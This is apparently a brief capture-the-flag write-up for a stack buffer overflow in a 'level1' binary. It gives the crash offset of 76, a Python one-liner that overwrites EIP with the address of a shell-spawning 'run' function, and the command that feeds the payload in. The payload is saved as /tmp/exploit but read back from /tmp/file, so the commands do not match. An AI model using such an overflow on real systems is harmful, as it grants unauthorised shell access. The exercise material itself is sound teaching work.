There is a run function that called /bin/sh but the main don't use it.
The program store our input into a fix buffer. There is no size limitation for our input

The program segfault at offset 76. Next four caracters will be eip.
$> python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/exploit

$> cat /tmp/file - | ./level1
